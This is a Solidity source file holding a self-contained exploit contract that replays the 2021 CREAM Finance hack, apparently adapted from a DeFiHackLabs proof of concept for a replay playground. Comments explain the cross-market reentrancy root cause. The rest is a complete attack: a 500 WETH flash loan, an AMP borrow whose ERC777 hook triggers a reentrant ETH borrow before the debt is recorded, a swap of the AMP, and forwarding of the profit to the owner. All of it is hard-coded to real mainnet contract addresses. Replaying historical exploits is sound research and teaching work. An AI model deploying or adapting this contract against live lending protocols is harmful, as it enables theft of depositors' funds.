// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.20;

// Synthetic standalone exploit for the EVM Playground (2021-08-Cream).
//
// The DeFiHackLabs PoC runs the attack INLINE in the Foundry `ContractTest`:
// the UniswapV2 flash-swap callback `uniswapV2Call` AND the AMP ERC777
// `tokensReceived` reentrancy hook both live on the test contract itself, and
// `mywallet = msg.sender`. There is no standalone contract to deploy. This file
// is a faithful, self-contained copy of that inline attack so the playground can
// deploy it and record `run()`. Logic and constants are copied verbatim from
// test/Cream_exp.sol.
//
// Root cause: CREAM's `CToken.borrowFresh` (Compound v2 fork) calls
// `doTransferOut` (sends the borrowed underlying out) BEFORE it writes the new
// debt to storage, and its `nonReentrant` lock is a PER-MARKET `_notEntered`
// flag. AMP is an ERC777-style token that fires a `tokensReceived` hook on
// transfer. So borrowing AMP from crAMP hands AMP to the attacker mid-transfer
// (before crAMP's debt is recorded); from that hook the attacker borrows ETH
// from the SEPARATE crETH market, whose own lock is still open and whose
// liquidity check sees the AMP debt as zero. The attacker walks away with both.

interface IERC20 {
    function approve(address spender, uint256 amount) external returns (bool);
    function transfer(address to, uint256 amount) external returns (bool);
}

interface IWETH {
    function deposit() external payable;
    function withdraw(uint256 wad) external;
    function balanceOf(address account) external view returns (uint256);
    function transfer(address to, uint256 amount) external returns (bool);
}

interface IUniswapV2Pair {
    function swap(uint256 amount0Out, uint256 amount1Out, address to, bytes calldata data) external;
}

interface IUniswapV2Router02 {
    function swapExactTokensForTokens(
        uint256 amountIn,
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external returns (uint256[] memory amounts);
}

interface ICEther {
    function mint() external payable;
    function borrow(uint256 borrowAmount) external returns (uint256);
}

interface ICErc20 {
    function accrueInterest() external returns (uint256);
    function borrow(uint256 borrowAmount) external returns (uint256);
}

interface IERC1820Registry {
    function setInterfaceImplementer(address _addr, bytes32 _interfaceHash, address _implementer) external;
}

contract CreamExploit {
    // --- victims / primitives -------------------------------------------------
    address constant AMP_TOKEN = 0xfF20817765cB7f73d4bde2e66e067E58D11095C2; // ERC777-style weaponized token
    address constant WETH_ADDR = 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2; // WETH
    address constant ERC1820 = 0x1820a4B7618BdE71Dce8cdc73aAB6C95905faD24; // ERC1820 registry
    address constant UNI_WETH_PAIR = 0xd3d2E2692501A5c9Ca623199D38826e513033a17; // flash-loan source
    address constant crETH_ADDR = 0xD06527D5e56A3495252A528C4987003b712860eE; // CEther market
    address constant crAMP_ADDR = 0x2Db6c82CE72C8d7D770ba1b5F5Ed0b6E075066d6; // CErc20Delegator (AMP) market
    address constant ROUTER = 0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D; // UniswapV2 router

    bytes32 constant TOKENS_RECIPIENT_INTERFACE_HASH =
        0xfa352d6368bbc643bcf9d528ffaba5dd3e826137bc42f935045c6c227bd4c72a;

    // 500 WETH flash loan; repay 502 WETH (0.3% fee headroom).
    uint256 constant FLASH_AMOUNT = 500 * 1e18;
    uint256 constant FLASH_REPAY = 502 * 1e18;
    // single round of the cross-market reentrancy (the live attack repeated ~17x)
    uint256 constant AMP_BORROW = 19_480_000_000_000_000_000_000_000; // 19.48M AMP
    uint256 constant REENTRANT_ETH_BORROW = 354 * 1e18; // ETH borrowed from crETH during the hook

    IWETH constant WETH = IWETH(WETH_ADDR);

    address public immutable owner;

    constructor() {
        owner = msg.sender;
    }

    // step 0: register self as an AMP recipient (so AMP.transfer fires the hook
    // here), then flash-borrow 500 WETH. The callback below does the exploit.
    function run() external {
        IERC1820Registry(ERC1820).setInterfaceImplementer(
            address(this), TOKENS_RECIPIENT_INTERFACE_HASH, address(this)
        );
        IUniswapV2Pair(UNI_WETH_PAIR).swap(0, FLASH_AMOUNT, address(this), "0x00");
    }

    // UniswapV2 flash-swap callback — runs the full attack and repays the loan.
    function uniswapV2Call(address, uint256, uint256, bytes calldata) external {
        require(msg.sender == UNI_WETH_PAIR, "only flash pair");

        WETH.withdraw(FLASH_AMOUNT); // 500 WETH -> 500 ETH
        ICEther(crETH_ADDR).mint{value: FLASH_AMOUNT}(); // deposit 500 ETH as crETH collateral
        ICEther(crETH_ADDR).borrow(1 * 1e18); // seed a tiny 1 ETH borrow
        ICErc20(crAMP_ADDR).accrueInterest(); // refresh crAMP indices

        // Borrow 19.48M AMP. doTransferOut -> Amp.transfer -> AMP fires
        // tokensReceived (below) BEFORE crAMP records the debt -> reentrant
        // crETH.borrow happens while the AMP loan is invisible to the liquidity check.
        ICErc20(crAMP_ADDR).borrow(AMP_BORROW);

        // Back from the hook: re-wrap the borrowed ETH (1 + 354 = 355 ETH).
        WETH.deposit{value: address(this).balance, gas: 40_000}();

        // Dump the borrowed AMP for WETH on the AMP/WETH pair.
        IERC20(AMP_TOKEN).approve(ROUTER, AMP_BORROW * 1000);
        address[] memory path = new address[](2);
        path[0] = AMP_TOKEN;
        path[1] = WETH_ADDR;
        IUniswapV2Router02(ROUTER).swapExactTokensForTokens(AMP_BORROW, 1, path, address(this), block.timestamp);

        // Repay the flash loan and forward the remaining WETH (profit) to the owner.
        WETH.transfer(UNI_WETH_PAIR, FLASH_REPAY);
        WETH.transfer(owner, WETH.balanceOf(address(this)));
    }

    // AMP ERC777 recipient hook — fired inside crAMP's doTransferOut, while the
    // AMP debt is still unrecorded. This is the cross-market reentrant borrow.
    function tokensReceived(
        bytes4,
        bytes32,
        address,
        address,
        address,
        uint256,
        bytes calldata,
        bytes calldata
    ) external {
        ICEther(crETH_ADDR).borrow(REENTRANT_ETH_BORROW);
    }

    receive() external payable {}
}
